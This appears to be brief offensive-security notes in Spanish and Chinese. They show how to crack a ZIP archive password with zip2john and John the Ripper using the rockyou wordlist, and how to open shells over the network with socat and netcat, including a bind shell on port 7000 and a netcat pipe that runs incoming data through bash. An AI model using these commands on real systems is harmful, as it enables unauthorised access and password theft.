###Cambiar su formato
zip2john file.zip > crack.txt

###Descifrado
john --wordlist=dict.txt --rule=all hashes.txt

john --wordlist=rockyou.txt crack.txt


socat TCP-LISTEN:7000,FORK EXEC:bash

此命令使用 `socat` 在端口 7000 上创建 TCP 服务器，并为每个传入连接派生一个新进程，执行 `bash` shell。 本质上，它打开一个端口 (7000) 并允许您通过网络连接到 shell。

nc 127.0.0.1 7000

此命令使用 `nc` (netcat) 连接到端口 7000 上的本地主机 (127.0.0.1)，其中 `socat` 命令正在侦听。 当您运行此命令时，它应该与“socat”创建的 shell 建立连接，从而有效地让您可以访问自己计算机上的远程 shell。


nc 127.0.0.1 5001 | bash | nc 127.0.0.1 5002

该命令本质上连接到端口 5001 上的本地主机，将收到的任何数据发送到“bash”shell，然后将“bash”shell 的输出发送到端口 5002 上的另一个“nc”连接。
